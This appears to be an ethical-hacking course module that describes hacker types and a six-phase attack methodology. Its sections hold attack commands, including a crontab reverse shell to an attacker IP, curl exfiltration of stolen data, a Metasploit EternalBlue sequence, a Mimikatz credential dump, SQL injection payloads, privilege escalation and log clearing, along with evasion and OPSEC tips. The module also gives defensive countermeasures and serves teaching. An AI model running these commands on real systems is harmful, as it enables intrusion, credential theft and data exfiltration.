2. Beginner Level

Foundational concepts for practitioners new to hacking concepts and adversary methodology. Assume zero prior knowledge of hacking phases, hacker types, or attack terminology.

# Core Concepts

What Is Hacking?

Hacking, in the context of computer security, is the exploitation of system vulnerabilities and the circumvention of security controls to gain unauthorized or inappropriate access to system resources. It often involves modifying system or application features to achieve objectives beyond their original design or purpose.

Hacking activities may include stealing or redistributing intellectual property, compromising data integrity, or disrupting normal business operations.

Network hacking commonly involves techniques such as:

  • Creating and distributing malware (viruses, worms, trojans, or backdoors)
  • Executing denial-of-service (DoS) and distributed DoS (DDoS) attacks
  • Establishing unauthorized remote access via trojans or backdoors
  • Creating botnets for large-scale control or spam distribution
  • Packet sniffing and eavesdropping on communications
  • Phishing and social engineering
  • Password cracking and credential stuffing
Note: Hackers' motives vary widely, from financial gain, espionage, and political activism to curiosity, experimentation, and the thrill of challenge.

Who Is a Hacker?

A hacker is an individual who explores or manipulates computer systems and networks, often by exploiting vulnerabilities or security flaws. While some hackers act maliciously, others use their skills for ethical or defensive purposes. Most hackers possess deep technical expertise, creative problem-solving ability, and extensive knowledge of programming, networking, and system internals.

For some, hacking is a way to test boundaries, explore new systems, or satisfy intellectual curiosity. For others, it serves financial, political, or ideological goals.

Ethical hackers, on the other hand, use the same skills to improve security by identifying and fixing weaknesses before adversaries exploit them.
(If you're reading this, congratulations, you're on that path!)

Analogy / Context

Think of hacking as lock-picking. A criminal uses lock-picks to break into a building to steal valuables. A locksmith uses the same tools to test the building's security and identify weak locks. The tools are the same: the intent, permission, and outcome are what distinguish the two.

Adversary Mindset Extension: Now imagine the criminal doesn’t just pick the front lock, they study the building for weeks, map the guard rotations, test every window, bribe a cleaner for a key, and install their own lock on the back door for future access. That's the adversary's mindset: layered, patient, and redundant.

# Hacker Types and Motivations

Hackers are often categorized by their intent, ethics, and objectives. Understanding these classifications helps security professionals anticipate attack patterns and design appropriate countermeasures.

Hacker Type Description & Motivation
Script Kiddies Unskilled attackers who use pre-built scripts and tools developed by others. They focus on volume rather than sophistication, often driven by curiosity or the desire for notoriety.
White Hat Hackers Authorized professionals (ethical hackers) who identify and remediate vulnerabilities. They follow rules of engagement and help organizations strengthen defenses.
Black Hat Hackers Individuals who exploit vulnerabilities for illegal or malicious purposes, such as theft, sabotage, or extortion. Often associated with criminal syndicates.
Gray Hat Hackers Operate in both offensive and defensive roles, sometimes disclosing vulnerabilities responsibly, other times exploiting them without authorization but not necessarily for profit.
Hacktivists Politically or socially motivated attackers who deface websites, leak confidential data, or disrupt systems to raise awareness or protest perceived injustices.
State-Sponsored Hackers Government-affiliated groups conducting espionage, sabotage, or cyber warfare operations against other nations or strategic industries.
Cyber Terrorists Actors using cyberattacks to cause widespread fear or disruption, often motivated by religious or ideological extremism.
Corporate/Industrial Spies Hackers engaged in corporate espionage to steal intellectual property, blueprints, or trade secrets for competitive advantage.
Blue Hat Hackers External security experts hired by organizations to test systems or software for vulnerabilities before public release.
Red Hat Hackers Vigilante hackers who target malicious actors (especially black hats). They use aggressive or even destructive methods to disrupt criminal operations.
Green Hat Hackers Newcomers to hacking who are eager to learn and practice ethical hacking, often motivated by education and curiosity rather than harm.
Suicide Hackers Attackers willing to face severe consequences for ideological or personal causes, aiming to cause large-scale damage regardless of self-risk.
Hacker Teams Organized groups of skilled hackers pooling resources and expertise for coordinated attacks or research on advanced techniques.
Insiders Employees or trusted individuals abusing legitimate access to cause harm, leak data, or facilitate unauthorized entry.
Criminal Syndicates Highly organized crime groups conducting long-term, sophisticated operations for profit, such as ransomware and fraud campaigns.
Organized Hackers Structured hacker groups operating like corporations, using layered management, rented infrastructure, and dark web marketplaces to conduct coordinated cybercrime.

# Phase Methodology: The Adversary's Tactical Pathway

While Information Security Concepts focused on the properties of data such as confidentiality, integrity, and availability, Hacking Concepts focuses on the mechanisms and vectors used to breach those properties.

This pathway breaks hacking into six operational phases. Each phase includes the concept, adversarial application, methods, tools, commands, expected evidence, and the security principle being challenged.

Phase 1: Information Gathering (Reconnaissance)

Hacking Concept:

  • Intelligence is absolute power across offensive operations.
  • You cannot exploit an asset that you do not fundamentally understand.

Adversarial Application:

  • Collect detailed data profiles before making any direct target contact.
  • Reduce the theoretical attack surface from millions of options down to a manageable entry list.

Adversarial Goal:

  • Map the external corporate attack surface comprehensively without alerting security defenses.

# Method A: Passive Recon

Operational Characteristics:

  • Gather critical intelligence without directly interacting with the target's active network systems.
  • Maintain a quiet operational footprint by relying completely on third-party public sources.

Key Mechanisms

  • OSINT: Social media scraping and employee directory analysis.
  • DNS Enumeration: Finding subdomains and email servers.
  • WHOIS: Identifying domain owners and registration dates.

Tools & Scripts

  • Maltego
  • Shodan
  • theHarvester

Example Script: Python OSINT

# Using theHarvester via command line to find emails and subdomains
# $ theHarvester -d target.com -b all

# Simple Python WHOIS Lookup Example
import whois

def get_domain_info(domain):
    try:
        w = whois.whois(domain)
        print(f"Registrar: {w.registrar}")
        print(f"Creation Date: {w.creation_date}")
        return w
    except Exception as e:
        print(f"Error: {e}")

get_domain_info("example.com")

# Method B: Active Recon

Active reconnaissance interacts directly with the target to gather detailed technical data. It gives better visibility, but it is noisier.

Key Mechanisms

  • Port Scanning: Identifying open ports such as 22/SSH, 80/HTTP, and 445/SMB.
  • Service Version Detection: Determining exact software versions running on exposed ports.
  • Banner Grabbing: Reading server banners that identify services and versions.

Tools & Payloads

  • Nmap
  • Netcat (nc)
  • Wireshark

Example Command: Nmap

# Aggressive scan: Open ports, service versions, OS detection, and default scripts
$ nmap -A -T4 192.168.1.50

# Quick Top Ports Scan
$ nmap -F 192.168.1.50

Example Script: Banner Grabbing with Netcat

# Connect to port 80 and request a page to see the server banner
$ echo -e "GET / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80

# Output might reveal: Server: Apache/2.4.49 (Ubuntu)

Technical Evidence Example

Tool: nmap (Network Mapper)

🔒 Security Concept Link: Reduces Information Asymmetry.
By gathering this data, the attacker shifts the advantage from the defender, who knows the system, to the attacker, who now understands possible entry points.

Phase 2: Vulnerability Analysis (The Weak Point)

Hacking Concept:

  • Every technical architecture possesses a fundamental flaw or operational weakness.
  • No corporate environment is perfectly secure due to constant configuration changes.
  • Unpatched software bugs and poor privilege assumptions remain persistent entry vectors.

Adversarial Application:

  • Map collected infrastructure intelligence profiles against known exploit catalogs.
  • Correlate target service revisions directly with active CVE tracking databases.
  • Isolate structural logical design gaps within the target application architecture.

Adversarial Goal:

  • Identify and confirm actionable security weaknesses across all discovered network services.

# Method A: Automated Vulnerability Scanning

Operational Characteristics:

  • Deploy specialized scanners to probe networks for missing patch configurations.
  • Flag exposed, high-risk background services and legacy dependencies automatically.
  • Verify service authorization layers against common default credential listings.

Key Mechanisms

  • CVE Mapping: Matching installed versions against public vulnerability records.
  • Missing Patches: Identifying missing KB updates or security fixes.
  • Default Credentials: Testing weak combinations such as admin:admin or root:root.

Tools & Payloads

  • Nessus
  • OpenVAS
  • Nmap NSE Scripts
  • Qualys

Example Command: Nmap Vulnerability Scan

# Uses Nmap's scripting engine to run vulnerability checks against open ports
$ nmap --script vuln 192.168.1.50

# Specific check for Heartbleed vulnerability in OpenSSL
$ nmap -p 443 --script ssl-heartbleed target.com

# Method B: Manual Analysis & Enumeration

Manual analysis focuses on logic flaws, hidden paths, exposed files, configuration mistakes, and application behavior that scanners often miss.

Key Mechanisms

  • Directory Brute-forcing: Guessing hidden URLs such as /admin or /backup.
  • Configuration Review: Checking for verbose errors or exposed .git folders.
  • API Fuzzing: Sending malformed data to APIs to observe crashes or leaks.

Tools & Payloads

  • Dirb / Gobuster
  • Burp Suite
  • Wfuzz

Example Script: Directory Brute-force with Gobuster

# Scan for common directories on a web server
$ gobuster dir -u http://192.168.1.50 -w /usr/share/wordlists/dirb/common.txt

# Output might reveal:
/admin (Status: 301)
/backup.zip (Status: 200)

Example Payload: SQL Injection Test

# A simple payload to test for SQL injection in a login form
Input: ' OR '1'='1 --

# Logic: It tricks the database into thinking the condition is always true,
# bypassing the password check.

Technical Evidence Example

Tool: searchsploit (Exploit Database CLI) or Nessus

Command

(root@iscsec)-[~/RedTeamPT/iscsec]$ searchsploit Apache 2.4.29

Output Interpretation: Public exploit references exist for this Apache version. This is a lead, not proof. The tester must validate whether the target configuration is actually vulnerable.

🔒 Security Concept Link: Targets Integrity and Availability gaps.
By identifying these flaws, the attacker finds the specific key to break data integrity or cause an availability outage.

Phase 3: Exploitation (The Breach)

Hacking Concept:

  • Transition a theoretical threat vector into an active proof-of-concept payload.
  • Turn abstract risk profiles into reality the moment code executes on a target asset.

Adversarial Application:

  • Deploy a highly specific exploit targeted at the identified software weakness.
  • Leverage confirmed system vulnerabilities to breach the network and establish an initial foothold.

Adversarial Goal:

  • Secure initial system access bounds through an authenticated and validated entry path.

# Method A: Remote Code Execution & SQL Injection

Operational Characteristics:

  • Utilize RCE and injection payloads as standard baseline methods to hijack system parameters.
  • Seize full operational control over exposed backend servers, active applications, or production databases.

Key Mechanisms

  • RCE: Sending a crafted request that triggers command execution on the operating system.
  • SQL Injection: Injecting SQL commands into input fields to read or modify database data.
  • Web Shells: Uploading a script that allows remote command execution through a browser.

Tools & Payloads

  • Metasploit Framework
  • sqlmap
  • Netcat (nc)
  • Cobalt Strike
  • Sliver

Example Payload: SQL Injection

# Target: Login page with 'username' field
Payload: admin' --

# Result: The database query becomes:
SELECT * FROM users WHERE user='admin' AND pass='--';

# The password check is ignored, granting access.

Example Command: Metasploit RCE

# Using Metasploit to exploit EternalBlue (SMB) on Windows 7
$ msfconsole
msf > use exploit/windows/smb/ms17_010_eternalblue
msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf > set RHOSTS 192.168.1.50
msf > exploit

# Result: A Meterpreter session opens (interactive shell).

# Method B: Buffer Overflow

Buffer overflow attacks overwrite program memory to alter execution flow.

Key Mechanisms

  • Fuzzing: Sending random data until the service crashes.
  • Shellcode: Small machine code that performs the intended action, such as spawning a shell.
  • Return Address Overwrite: Redirecting execution to attacker-controlled code.

Tools & Payloads

  • GDB (GNU Debugger)
  • pwntools
  • Immunity Debugger

Example Script: Python Buffer Overflow (Fuzzing)

import socket

# Create a socket connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.50', 1337)) # Target IP and Port

# Send 'A's to fill the buffer (e.g., 400 bytes)
# This is fuzzing: we test if the service crashes
payload = b'A' * 400
s.send(payload)

# Receive response to see if it crashes
print(s.recv(1024))
s.close()

🔒 Security Concept Link: Directly attacks Authentication and Authorization.
By exploiting these flaws, the attacker bypasses standard login screens or permissions and gains access without valid credentials.

Phase 4: Privilege Escalation (Going Deeper)

Hacking Concept:

  • Differentiate low-level standard user access from administrative domain power.
  • Acknowledge that securing an initial system foothold is rarely sufficient.
  • Maintain absolute backend control over the operating system, application, or wider network domain.

Adversarial Application:

  • Audit internal configuration states immediately after establishing a low-privileged foothold.
  • Enumerate local environment weaknesses to slide into elevated roles like Local Admin, SYSTEM, root, or Domain Admin.

Adversarial Goal:

  • Transition safely from standard user visibility up to total administrative system control.

# Method A: Vertical Escalation

Operational Characteristics:

  • Advance upward through the target operating system's logical privilege hierarchy.
  • Shift standard execution paths into Local Administrator or SYSTEM roles on Windows systems.
  • Leverage configuration or kernel vulnerabilities to transform a basic user into root on Linux environments.

Key Mechanisms

  • Kernel Exploits: Abusing operating system bugs to gain control.
  • Unquoted Service Paths: Exploiting spaces in Windows service paths.
  • Sudo Misconfigurations: Abusing weak sudo rules or passwordless commands.

Tools & Techniques

  • WinPEAS
  • LinPEAS
  • PowerSploit
  • GTFOBins

Example Command: Linux Sudo Privileges

# Check what sudo commands the current user can run
$ sudo -l

# If output shows: (root) NOPASSWD: /bin/bash
# Then simply type:
$ sudo bash

# Result: You are now Root.

# Method B: Horizontal Escalation

Horizontal escalation moves across identities or systems, such as User A to User B, to access shared resources or credentials.

Key Mechanisms

  • Credential Dumping: Extracting passwords, hashes, or tickets from memory and files.
  • Pivoting: Using a compromised machine as a bridge into other systems.
  • Ticket Forgery: Stealing or forging Kerberos tickets in Active Directory.

Tools & Techniques

  • Mimikatz
  • BloodHound
  • Impacket
  • PsExec

Example Command: Mimikatz Credential Dump

# Run in an elevated PowerShell prompt on Windows
$ Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# Output reveals plaintext passwords, NTLM hashes, and Kerberos tickets
# for users logged into the system.

Technical Evidence Example

Tool: LinPEAS.sh

Command

(root@iscsec)-[~/RedTeamPT/iscsec]$ ./linpeas.sh | grep -i "sudo"
[+] Can sudo without password: /usr/bin/find
[!] Possible EoP with find: https://gtfobins.github.io/gtfobins/find/

Exploitation Command

(root@iscsec)-[~/RedTeamPT/iscsec]$ sudo find . -name "exploit" -exec /bin/sh \;
# whoami
root

# id
uid=0(root) gid=0(root) groups=0(root)

Output Interpretation: The find command is executable by the user without a password, allowing arbitrary command execution as root.

🔒 Security Concept Link: Exploits weak Authorization models.
Even if authentication is strong, poor authorization can let a low-level user escalate privileges or impersonate others.

Phase 5: Lateral Movement & Persistence (Expanding Footprint)

Hacking Concept:

  • Avoid isolating all access inside a single compromised system shell or foothold.
  • Ensure fallback connection paths are established if the primary entry point is closed.
  • Create persistent mechanism tunnels to maintain a long-term presence on target systems.

Adversarial Application:

  • Pivot from the initial compromised host outward to adjacent corporate network segments.
  • Hunt for high-value targets including backend database vaults, active file servers, identity systems, and central business applications.

Adversarial Goal:

  • Maintain a permanent network presence and ensure access configurations survive host reboots, patch cycles, or active session terminations.

# Method A: Lateral Movement

Operational Characteristics:

  • Traverse laterally across adjacent internal machines to broaden visibility within the infrastructure.
  • Harvest credentials and exploit trust relationships to systematically discover higher-value data storage nodes.

Key Mechanisms

  • Pass-the-Hash: Using an NTLM hash instead of a plaintext password.
  • Remote Execution: Running commands on remote systems using PsExec or WMI.
  • SMB/RDP Jumping: Accessing file shares or desktops with stolen credentials.

Tools & Techniques

  • PsExec
  • WMI (Windows Management Instrumentation)
  • CrackMapExec (CME)
  • Impacket (psexec.py, wmiexec.py)

Example Command: PsExec Remote Shell

# Using PsExec to open a shell on a remote machine
$ psexec.exe \\192.168.1.50 -u Administrator -p P@ssw0rd cmd

# Result: A command prompt opens on the remote server,
# executing as the specified user.

Example Command: sshpass (Credential Reuse)

# If a password was recovered from the initial foothold,
# it may be reused for lateral SSH access.
sshpass -p 'password123' ssh user@192.168.1.20

# Method B: Persistence

Persistence ensures access remains after a reboot, session drop, password change, or service restart.

Key Mechanisms

  • Registry Run Keys: Adding entries that execute when a user logs in.
  • Scheduled Tasks: Running commands or beacons at defined intervals.
  • Backdoors: Installing a listener or access method that starts with the OS.

Tools & Techniques

  • PowerShell
  • Task Scheduler
  • Metasploit Modules
  • Cobalt Strike
  • Sliver

Example Command: Registry Persistence

# Add a PowerShell script to run at login
$ reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run
/v MyUpdate /t REG_SZ /d "C:\Users\Public\update.ps1"

# Result: Every time the user logs in, update.ps1 executes silently.

Example Command: Crontab Persistence (User-Level)

# Standard user adds a recurring reverse shell via crontab
$ (crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'") | crontab -
🔒 Security Concept Link: Targets Availability and Confidentiality of broader network assets.
By moving laterally, attackers bypass perimeter defenses to access internal data. By establishing persistence, they keep access even if the initial vulnerability is patched.

Phase 6: Exfiltration & Evasion (The Exit)

Hacking Concept:

  • Stealth is the absolute requirement for operational survival.
  • Securing access is only the baseline layer of a complex offensive engagement.
  • Extracting high-value data and exfiltrating it undetected remains the ultimate technical challenge.

Adversarial Application:

  • Package and compress collected target data stores securely for external transmission.
  • Obfuscate active traffic signatures to completely blind monitoring Blue Team analysts.
  • Clear log footprints systematically to stall security response teams and disrupt incident timelines.

Adversarial Goal:

  • Safely extract targeted data volumes and conceal operational footprints from network detection sensors.

# Method A: Data Exfiltration

Operational Characteristics:

  • Establish unauthorized outbound network connections to transfer gathered data sets.
  • Leverage DNS tunneling, encrypted web streams, or hidden cloud storage vectors to slip past firewall inspectors.

Key Mechanisms

  • Tunneling: Sending data over common ports such as HTTPS/443 or DNS/53 to avoid firewall blocks.
  • Compression & Encryption: Zipping files and encrypting them to reduce size and hide content.
  • DNS Exfiltration: Encoding small chunks of data into DNS queries, such as data.evil.com.

Tools & Techniques

  • Mimikatz (for creds)
  • Netcat
  • SCP/SFTP
  • Cobalt Strike (Beacon)
  • tar, gzip, curl

Example Command: Simple HTTP Upload

# Using curl to upload a file to an attacker's server
$ curl -T stolen_data.zip http://192.168.1.100/upload

# Result: The file is sent over port 80/443, looking like normal web traffic.

Command: Packaging Data

(root@iscsec)-[~/RedTeamPT/iscsec]$ tar -czvf /tmp/data_dump.tar.gz /var/www/html/database.sql

Command: Exfiltration via HTTP

# Simple HTTP Exfil
(root@iscsec)-[~/RedTeamPT/iscsec]$ curl -X POST -d @/tmp/data_dump.tar.gz http://10.10.14.5:8080/upload

# Method B: Evasion & Covering Tracks

Evasion hides activity from detection systems and can include log tampering, obfuscation, and the use of trusted native tools.

Key Mechanisms

  • Living off the Land: Using built-in OS tools such as PowerShell or PsExec instead of downloading malware.
  • Obfuscation: Encoding scripts to bypass simple text-based detection.
  • Log Clearing: Deleting Windows Event Logs or Linux /var/log files to remove evidence.

Tools & Techniques

  • PowerShell One-Liners
  • Eventvwr.exe
  • Wevtutil
  • Cmder

Example Command: Clear Event Logs

# Clear the Windows System and Application logs
$ wevtutil.exe cl System
$ wevtutil.exe cl Application

# Result: The "Event Viewer" appears clean, hiding recent intrusion activities.
🔒 Security Concept Link: Compromises Confidentiality and hides violations of Integrity.
If exfiltration succeeds, Confidentiality is lost. If logs are cleared, the Blue Team may struggle to prove integrity violations or reconstruct the timeline.

4. Advanced / Operator Level

Deep technical detail for operators conducting authorized assessments. This level focuses on the adversary's tactical pathway and advanced evasion techniques.

Advanced Evasion Techniques

Advanced operators understand that detection is not binary, it's a probability. The goal is to reduce the probability of detection through multiple layers of evasion.

Living off the Land

Using built-in OS tools instead of downloading malware. This bypasses many EDR solutions that monitor for known malicious binaries.

  • Windows: PowerShell, WMI, PsExec, CertUtil, BitsAdmin
  • Linux: Bash, Python, Perl, wget, curl, ssh, scp

Log Tampering

Attackers may use sed/awk to strip their IP from logs instead of deleting entire files. Defenders detect this via file integrity monitoring (FIM) and centralized SIEM forwarding.

Defensive Counter-Measures

  • Forward logs to an immutable SIEM before they can be tampered with.
  • Use Sysmon Event ID 1 (process creation) to detect suspicious command-line activity.
  • Monitor for bulk data access during off-hours (UEBA).
  • Baseline scheduled tasks and registry run keys to detect persistence mechanisms.

Exploitation Metasploit, Cobalt Strike, Sliver, custom exploits, web shells EDR process creation events, network anomaly detection, AV signatures Use memory-only payloads; obfuscate shellcode; avoid known exploit signatures
Privilege Escalation LinPEAS, WinPEAS, PowerSploit, Mimikatz, BloodHound Privilege escalation detection, LSASS access alerts, suspicious process behavior Run enumeration tools from memory; use reflective loading; blend with legitimate admin activity
Lateral Movement & Persistence PsExec, WMI, CrackMapExec, Impacket, scheduled tasks, registry run keys Service creation logs, scheduled task changes, registry monitoring, SMB connection anomalies Use trusted admin protocols; mimic legitimate service names; use domain admin accounts during business hours
Exfiltration & Evasion curl, scp, DNS tunneling tools, steganography, encrypted archives Data transfer size anomalies, outbound traffic to unknown domains, protocol violations Exfiltrate in small chunks; use common ports; encrypt data; blend with legitimate business traffic

Adversary Operational Security (OPSEC) Considerations

  • Command and Control (C2) Discipline: Use domain fronting, CDN routing, or legitimate cloud services (AWS, Azure) to mask C2 traffic. Never use attacker infrastructure without proper anonymization.
  • Credential Management: Never reuse credentials across operations. Use unique passwords, VPN endpoints, and operational personas for each engagement.
  • Timing Obfuscation: Schedule scanning, exploitation, and exfiltration during legitimate business hours to blend with normal traffic patterns.
    Human operators are more likely to overlook anomalies during peak activity.
  • Beaconing Discipline: Use jittered beacon intervals (e.g., 5-15 minutes with random variation) rather than fixed intervals. This breaks detection patterns based on consistent timing.
  • Cleanup Procedures: Plan and execute cleanup before the engagement ends. Remove tools, delete logs, revert configuration changes, and validate that persistence mechanisms are disabled.

5. Adversarial Level

Threat actor perspective. Advanced persistent threats, criminal groups, and red teams operate with a deep understanding of both the human and technical domains.

Threat Actor Behavior

Human Domain

  • Insiders with legitimate access are among the most dangerous threats because they bypass perimeter defenses.
  • State-sponsored hackers conduct long-term reconnaissance (months to years) before deploying custom malware.
  • Criminal syndicates operate like corporations with layered management, rented infrastructure, and dark web marketplaces.

Technical Domain

  • Reconnaissance is often performed during off-hours when defenders are less likely to notice scanning activity.
  • Weaponization uses legitimate tools (LOLBins) to avoid detection signatures.
  • Exfiltration uses common ports (HTTPS/443, DNS/53) to blend with normal traffic.
  • Evasion includes clearing logs, timestamp tampering, and disabling auditing features.

Adversary Philosophy and Mindset

  • Patience is Strategy: Advanced adversaries measure time in months or years. They don’t need to move fast, they need to move right.
    Every 24-hour delay increases the probability of success by allowing more intelligence collection.
  • Redundancy is Survival: Successful adversaries maintain multiple footholds, C2 channels, and persistence mechanisms. One compromised account is not a failure, it’s a learning opportunity. The next attempt will be better.
  • Deniability is Protection: Advanced groups use infrastructure that can be abandoned, impersonation of other groups (false flags), and plausible deniability to complicate attribution. They know attribution is political as much as technical.
  • Human Intelligence is Force Multiplier: Social engineering, pretexting, and insider recruitment are often more effective than zero-days.
    People will always be the weakest link in any security chain.
  • Automation is Scalability: Criminal syndicates automate ransomware deployment, credential stuffing, and reconnaissance. Manual operations are for hunting high-value targets; automation is for volume and profit.
  • Adaptation is Evolution: Defenders' tools improve, so adversaries adapt. For every new detection capability, there is a new evasion technique.
    The defender's victory is temporary; the adversary's adaptation is perpetual.

"You now speak the adversary's language in two dialects: the human dialect of motives and roles, and the technical dialect of phased operations.
From this point forward, every command you type must answer three questions: Which phase am I in? Which principle am I testing? And what would a defender see if I did this without permission?"

7. Key Takeaways

Takeaway Operator Meaning Defensive Translation
Hacking follows a pathway Adversarial activity is structured. It moves through reconnaissance, analysis, exploitation, escalation, movement, persistence, exfiltration, and evasion. Defend every phase, not just the perimeter. Assume breach and detect lateral movement.
Reconnaissance reduces uncertainty Information gathering helps identify likely attack paths before any deeper testing occurs. Monitor OSINT exposure, implement deception, and log active scanning attempts.
Vulnerability analysis creates targets Collected information becomes useful when you map it to flaws, misconfigurations, CVEs, and weak controls. Patch aggressively, remove default credentials, and validate with regular scanning.
Access is only the beginning Exploitation provides initial access, while privilege escalation and lateral movement expand control. Segment networks, enforce least privilege, and monitor for credential abuse.
Persistence and evasion extend the operation Persistence helps maintain access. Evasion attempts to avoid detection by logs, EDR, SIEM, and other controls. Deploy EDR, forward logs to immutable SIEM, and baseline scheduled tasks/registry keys.
Every phase impacts security principles Each step can affect Confidentiality, Integrity, Availability, Authentication, Authorization, or Non-repudiation. Map defensive controls to the CIAAN elements they protect and audit for gaps.
Evidence connects theory to reality Commands, output, logs, screenshots, and artifacts help analysts prove what happened and why it matters. Preserve chain of custody; evidence is as critical for defense as it is for offense.
Defenders break the chain Strong defense focuses on prevention, detection, response, and recovery across every phase of the intrusion lifecycle. Assume the adversary will reach Phase 3. Build detection for Phases 4–6.
